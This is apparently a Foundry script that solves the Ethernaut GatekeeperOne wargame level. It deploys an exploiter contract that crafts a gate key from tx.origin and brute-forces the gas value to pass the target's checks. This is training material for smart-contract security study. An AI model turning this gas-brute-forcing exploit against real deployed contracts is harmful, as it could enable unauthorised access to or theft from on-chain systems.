pragma solidity ^0.8.0;
import "../instances/Ilevel13.sol";
import "forge-std/Test.sol";

contract Level13 is Test {
    GatekeeperOne level13 =
        GatekeeperOne(0xfc36d53515Ea1E1b87Bc17AB8b9F44fbC083552c);

    function test() external {
        uint256 attackerPrivateKey = vm.envUint("PRIVATE_KEY");
        address attacker = vm.addr(attackerPrivateKey);
        vm.startBroadcast(attackerPrivateKey);
        GatekeeperOneExploiter exp = new GatekeeperOneExploiter();
        exp.exploit(address(level13));
        require(level13.entrant() == attacker);
        vm.stopBroadcast();
    }
}

contract GatekeeperOneExploiter {
    function exploit(address _target) public {
        uint256 multiplier = 8191;
        bytes8 _gateKey = bytes8(
            uint64(uint16(uint160(tx.origin))) |
                uint64(bytes8(0xff00000000000000))
        );
        for (uint256 i = 0; i < 300; i++) {
            (bool success, ) = address(_target).call{gas: i + multiplier}(
                abi.encodeWithSignature("enter(bytes8)", _gateKey)
            );
            if (success) {
                break;
            }
        }
    }
}
